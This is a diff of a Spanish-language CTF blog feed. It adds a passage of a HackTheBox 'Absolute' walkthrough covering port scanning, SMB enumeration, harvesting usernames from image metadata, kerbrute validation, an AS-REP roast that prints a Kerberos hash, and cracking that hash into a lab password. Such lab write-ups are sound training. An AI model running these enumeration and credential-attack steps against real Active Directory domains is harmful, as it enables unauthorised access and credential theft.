@@ -1,5 +1,823 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-15T12:24:04-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
-</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Fulcrum (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum.html" rel="alternate" type="text/html" title="HackTheBox - Fulcrum (insane)" /><published>2024-06-15T00:00:00-06:00</published><updated>2024-06-15T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum.html"><![CDATA[<p align="center">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-19T02:58:35-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
+</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Absolute (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/06/19/absolute.html" rel="alternate" type="text/html" title="HackTheBox - Absolute (insane)" /><published>2024-06-19T00:00:00-06:00</published><updated>2024-06-19T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/06/19/absolute</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/06/19/absolute.html"><![CDATA[<p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/d5dbb09284d3265d91f50eb4ad32fee2.png" />
+</p>
+
+<ul>
+  <li>Absolute is an Insane Windows Active Directory machine that starts with a webpage displaying some images, whose metadata is used to create a wordlist of possible usernames that may exist on the machine. It turns out that one of these users doesnt require Pre-authentication, therefore posing a valuable target for an <code class="language-plaintext highlighter-rouge">ASREP</code> roast attack. The discovered credentials are then used to enumerate <code class="language-plaintext highlighter-rouge">LDAP</code> and discover credentials for the user <code class="language-plaintext highlighter-rouge">svc_smb</code>, who has access to an <code class="language-plaintext highlighter-rouge">SMB</code> share containing a Windows binary. Performing dynamic analysis on the binary reveals that it tries to perform an <code class="language-plaintext highlighter-rouge">LDAP</code> connection to the Domain Controller with clear text credentials for the <code class="language-plaintext highlighter-rouge">m.lovegod</code> user, who owns the <code class="language-plaintext highlighter-rouge">Network Audit</code> group, which in turn has <code class="language-plaintext highlighter-rouge">Generic Write</code> over the <code class="language-plaintext highlighter-rouge">winrm_user</code>. Following this attack path and performing a shadow credential attack on the <code class="language-plaintext highlighter-rouge">winrm_user</code>, one can then <code class="language-plaintext highlighter-rouge">WinRM</code> and access the machine. Finally, the <code class="language-plaintext highlighter-rouge">KrbRelay</code> tool is used to add the <code class="language-plaintext highlighter-rouge">winrm_user</code> user to the Administrators group, leading to fully elevated privileges.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49684,49685,49697,49701 10.10.11.181 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-17 18:15 CST
+Nmap scan report <span class="k">for </span>10.10.11.181
+Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Absolute
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-06-18 07:15:35Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
+| Not valid before: 2023-07-17T21:11:52
+|_Not valid after:  2024-07-16T21:11:52
+|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
+| Not valid before: 2023-07-17T21:11:52
+|_Not valid after:  2024-07-16T21:11:52
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
+| Not valid before: 2023-07-17T21:11:52
+|_Not valid after:  2024-07-16T21:11:52
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
+| Not valid before: 2023-07-17T21:11:52
+|_Not valid after:  2024-07-16T21:11:52
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49684/tcp open  msrpc         Microsoft Windows RPC
+49685/tcp open  msrpc         Microsoft Windows RPC
+49697/tcp open  msrpc         Microsoft Windows RPC
+49701/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   <span class="nb">date</span>: 2024-06-18T07:16:36
+|_  start_date: N/A
+|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Estamos ante un entorno de Directorio Activo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.181
+SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregar el nombre del dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.181 absolute.htb dc.absolute.htb DC.absolute.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.11.181 absolute.htb dc.absolute.htb DC.absolute.htb
+</code></pre></div></div>
+
+<ul>
+  <li>No podemos enumerar recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.181 <span class="nt">-u</span> <span class="s2">"miguelito"</span> <span class="nt">-p</span> <span class="s2">""</span> <span class="nt">--shares</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span>-] absolute.htb<span class="se">\m</span>iguelito: STATUS_LOGON_FAILURE
+➜  nmap smbmap <span class="nt">-H</span> 10.10.11.181 <span class="nt">--no-banner</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+<span class="o">[!]</span> Something weird happened: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - <span class="o">{</span>Access Denied<span class="o">}</span> A process has requested access to an object but has not been granted those access rights. on line 970
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+  File <span class="s2">"/usr/bin/smbmap"</span>, line 33, <span class="k">in</span> &lt;module&gt;
+    sys.exit<span class="o">(</span>load_entry_point<span class="o">(</span><span class="s1">'smbmap==1.9.2'</span>, <span class="s1">'console_scripts'</span>, <span class="s1">'smbmap'</span><span class="o">)())</span>
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File <span class="s2">"/usr/lib/python3/dist-packages/smbmap/smbmap.py"</span>, line 1435, <span class="k">in </span>main
+    host <span class="o">=</span> <span class="o">[</span> host <span class="k">for </span>host <span class="k">in </span>share_drives_list.keys<span class="o">()</span> <span class="o">][</span>0]
+                              ^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: <span class="s1">'bool'</span> object has no attribute <span class="s1">'keys'</span>
+^CYou pressed Ctrl+C!...
+You pressed Ctrl+C!
+➜  nmap smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.10.11.181
+Anonymous login successful
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+do_connect: Connection to 10.10.11.181 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<ul>
+  <li>Tampoco podemos enumerar por <code class="language-plaintext highlighter-rouge">rpcclient</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.11.181
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la página web.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/absolute/1.png" />
+</p>
+
+<ul>
+  <li>Estas son las tecnologías que están corriendo en la pagina web.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.181</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.181</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.181</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">3.3</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Absolute</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si hacemos <code class="language-plaintext highlighter-rouge">fuzzing</code> no encontramos anda interesante mas que la ruta <code class="language-plaintext highlighter-rouge">images</code> que al parecer son varias con el nombre de <code class="language-plaintext highlighter-rouge">hero</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content feroxbuster <span class="nt">-u</span> http://10.10.11.181 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
+|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
+by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.10.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.181
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ <span class="nb">true</span>
+ 🏁  HTTP methods          │ <span class="o">[</span>GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
+301      GET        2l       10w      150c http://10.10.11.181/images <span class="o">=&gt;</span> http://10.10.11.181/images/
+200      GET       33l       64w      782c http://10.10.11.181/js/main.js
+200      GET        6l       77w     3351c http://10.10.11.181/css/owl.carousel.min.css
+200      GET      145l      442w     4030c http://10.10.11.181/css/style.css
+200      GET        5l      369w    21003c http://10.10.11.181/js/popper.min.js
+200      GET        7l      689w    63240c http://10.10.11.181/js/bootstrap.min.js
+200      GET        7l      277w    44342c http://10.10.11.181/js/owl.carousel.min.js
+200      GET        2l     1283w    86926c http://10.10.11.181/js/jquery-3.3.1.min.js
+301      GET        2l       10w      150c http://10.10.11.181/Images <span class="o">=&gt;</span> http://10.10.11.181/Images/
+200      GET     3625l     7946w    77906c http://10.10.11.181/css/animate.css
+200      GET     4919l     8218w    79820c http://10.10.11.181/fonts/icomoon/style.css
+200      GET        7l     2103w   160392c http://10.10.11.181/css/bootstrap.min.css
+403      GET       29l       92w     1233c http://10.10.11.181/fonts/
+403      GET       29l       92w     1233c http://10.10.11.181/fonts/icomoon/
+403      GET       29l       92w     1233c http://10.10.11.181/js/
+403      GET       29l       92w     1233c http://10.10.11.181/css/
+301      GET        2l       10w      147c http://10.10.11.181/css <span class="o">=&gt;</span> http://10.10.11.181/css/
+200      GET      948l     7256w   690337c http://10.10.11.181/images/hero_3.jpg
+200      GET     2425l    11064w   656123c http://10.10.11.181/images/hero_2.jpg
+200      GET     1306l     7961w   733740c http://10.10.11.181/images/hero_1.jpg
+200      GET        0l        0w  5501527c http://10.10.11.181/images/hero_6.jpg
+200      GET        0l        0w  2085276c http://10.10.11.181/images/hero_4.jpg
+200      GET        0l        0w  1834774c http://10.10.11.181/images/hero_5.jpg
+</code></pre></div></div>
+
+<ul>
+  <li>Como tal las imágenes existen.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/absolute/2.png" />
+</p>
+
+<ul>
+  <li>Son 6 imágenes en total así que vamos a descargarlas todas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..6<span class="o">}</span><span class="p">;</span> <span class="k">do </span>wget <span class="s2">"http://10.10.11.181/images/hero_</span><span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="s2">.jpg"</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">"Descargada la imagen hero_</span><span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="s2">.jpg"</span><span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si inspeccionamos una foto con <code class="language-plaintext highlighter-rouge">exiftool</code> vemos que en el apartado de <code class="language-plaintext highlighter-rouge">Author</code> encontramos un nombre de usuario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content exiftool hero_1.jpg
+ExifTool Version Number         : 12.76
+File Name                       : hero_1.jpg
+Directory                       : <span class="nb">.</span>
+File Size                       : 407 kB
+File Modification Date/Time     : 2022:06:07 14:45:20-05:00
+File Access Date/Time           : 2024:06:18 12:12:39-06:00
+File Inode Change Date/Time     : 2024:06:18 12:12:39-06:00
+File Permissions                : <span class="nt">-rw-r--r--</span>
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+Exif Byte Order                 : Little-endian <span class="o">(</span>Intel, II<span class="o">)</span>
+X Resolution                    : 72
+Y Resolution                    : 72
+Resolution Unit                 : inches
+Artist                          : James Roberts
+Y Cb Cr Positioning             : Centered
+Quality                         : 60%
+XMP Toolkit                     : Image::ExifTool 11.88
+Author                          : James Roberts
+Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
+Derived From Document ID        : 6413FD608B5C21D0939F910C0EFBBE44
+Derived From Instance ID        : 6413FD608B5C21D0939F910C0EFBBE44
+Document ID                     : xmp.did:887A47FA048811EA8574B646AF4FC464
+Instance ID                     : xmp.iid:887A47F9048811EA8574B646AF4FC464
+DCT Encode Version              : 100
+APP14 Flags 0                   : <span class="o">[</span>14], Encoded with <span class="nv">Blend</span><span class="o">=</span>1 downsampling
+APP14 Flags 1                   : <span class="o">(</span>none<span class="o">)</span>
+Color Transform                 : YCbCr
+Image Width                     : 1900
+Image Height                    : 1150
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 <span class="o">(</span>1 1<span class="o">)</span>
+Image Size                      : 1900x1150
+Megapixels                      : 2.2
+</code></pre></div></div>
+
+<ul>
+  <li>Como vemos un nombre de usuario los mas probable es que los demás usuarios también tengan un nombre de usuario en cada foto así que vamos a filtrar por ese campo para ver los nombres.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content exiftool hero_<span class="k">*</span>.jpg <span class="nt">-Author</span>
+<span class="o">========</span> hero_1.jpg
+Author                          : James Roberts
+<span class="o">========</span> hero_2.jpg
+Author                          : Michael Chaffrey
+<span class="o">========</span> hero_3.jpg
+Author                          : Donald Klay
+<span class="o">========</span> hero_4.jpg
+Author                          : Sarah Osvald
+<span class="o">========</span> hero_5.jpg
+Author                          : Jeffer Robinson
+<span class="o">========</span> hero_6.jpg
+Author                          : Nicole Smith
+    6 image files <span class="nb">read</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos hacer una lista con la estructura de los nombres de un Active Directory primero la letra mayúscula y después su nombre.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>users.txt
+J.Roberts
+M.Chaffrey
+D.Klay
+S.Osvald
+J.Robinson
+N.Smith
+</code></pre></div></div>
+
+<ul>
+  <li>Teniendo esta lista potencial de usuarios vamos a ver si son validos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content /opt/kerbrute_linux_amd64 userenum <span class="nt">--dc</span> dc.absolute.htb <span class="nt">-d</span> absolute.htb users.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 06/18/24 - Ronnie Flathers @ropnop
+
+2024/06/18 12:56:17 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2024/06/18 12:56:17 <span class="o">&gt;</span>  	dc.absolute.htb:88
+
+2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 M.Chaffrey@absolute.htb
+2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 S.Osvald@absolute.htb
+2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 J.Roberts@absolute.htb
+2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 N.Smith@absolute.htb
+2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 J.Robinson@absolute.htb
+2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 D.Klay@absolute.htb
+2024/06/18 12:56:17 <span class="o">&gt;</span>  Done! Tested 6 usernames <span class="o">(</span>6 valid<span class="o">)</span> <span class="k">in </span>0.331 seconds
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora que sabemos que los usuario son validos podemos probar un <code class="language-plaintext highlighter-rouge">ASREPRoast Attack</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers absolute.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span>-] User J.Roberts doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User M.Chaffrey doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="nv">$krb5asrep$23$D</span>.Klay@ABSOLUTE.HTB:90b6ffe0ec2f136b9268b7bc5ea29f46<span class="nv">$f2f0909c2a88da7f818720581aaf8143b646f285fb93489bf228d37acfb190c7d777ce0b22a5e61a7e9f6b293037e0f90899db4de678920773547c032cbd26dd22f9008e75a75b8ce4902959778bb52344bd76e61bfb406e575105b4d2e62130261f43b535333dddaa1587116edaac1babeb69b3e85f45797513a2f5852b97995127fced566cd2a65d8358fa894c5dae47938dd083c99c21c28055ff83ffa743e66a899ceb26a6fa1edac18796ddb7f26791309cfb6a812e6e0dbbc76ce8abddb9ed9929aa8c351e3db6932389544a85c0cb06c375de560737b51872ed9810f2131fbd785f979d7eb2d0054b</span>
+<span class="o">[</span>-] User S.Osvald doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User J.Robinson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User N.Smith doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+</span></code></pre></div></div>
+
+<ul>
+  <li>Tenemos el hash de <code class="language-plaintext highlighter-rouge">D.Klay</code> vamos a crackearlo para ver su contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+Darkmoonsky248girl <span class="o">(</span><span class="nv">$krb5asrep$23$D</span>.Klay@ABSOLUTE.HTB<span class="o">)</span>
+1g 0:00:00:24 DONE <span class="o">(</span>2024-06-18 13:00<span class="o">)</span> 0.04149g/s 466323p/s 466323c/s 466323C/s DarrenCahppell..Danuelle
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos credenciales.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo</span> <span class="s2">"D.Klay:Darkmoonsky248girl"</span> | <span class="nb">sudo tee </span>creds.txt
+D.Klay:Darkmoonsky248girl
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a sincronizarnos al reloj del dominio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">sudo </span>ntpdate <span class="nt">-s</span> absolute.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Sin embargo las credenciales nos devuelven un <code class="language-plaintext highlighter-rouge">STATUS_ACCOUNT_RESTRICTION</code> <a href="https://blog.whiteflag.io/blog/protected-users-you-thought-you-were-safe/">https://blog.whiteflag.io/blog/protected-users-you-thought-you-were-safe/</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span>-] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION
+</code></pre></div></div>
+
+<ul>
+  <li>Si nos autenticamos con el protocolo de <code class="language-plaintext highlighter-rouge">kerberos</code> nos dicen que si son correctas.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/absolute/3.png" />
+</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span> <span class="nt">-k</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl
+</code></pre></div></div>
+
+<h2 id="svc_smb">svc_smb</h2>
+
+<ul>
